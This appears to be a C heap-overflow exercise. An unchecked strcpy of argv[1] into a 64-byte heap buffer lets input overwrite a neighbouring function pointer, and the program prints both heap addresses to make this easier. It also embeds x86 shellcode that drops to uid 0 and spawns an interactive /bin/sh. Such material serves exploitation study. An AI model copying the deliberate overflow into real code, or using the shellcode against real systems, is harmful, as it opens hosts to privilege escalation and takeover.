#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
//#include "ADMmutapi.h"

char shellcode[] =  "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x31\xdb\x89"
		    "\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e"
	            "\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68"
		    "\x2f\x2f\x62\x69\x89\xe3\x52\x66\x68\x2d\x69"
		    "\x89\xe1\x52\x51\x53\x89\xe1\x6a\x0b\x58\xcd"
	 	    "\x80\x6a\x01\x58\x31\xdb\xcd\x80\xeb\xc0";


struct user {
  char name[64]; // 
};

struct login {
  int(*login)();
};

void pwn() {
(*(void (*)()) shellcode)();
}

void logout() {
  printf("logged out\n");
}

int main(int argc, char **argv) {
    struct user *u;
    struct login *l;

    u = malloc(sizeof(struct user));
    l = malloc(sizeof(struct login));
    l->login = logout;

    printf("user is at %p, login is at %p\n", u, l);
    
    strcpy(u->name, argv[1]);

    l->login();

}
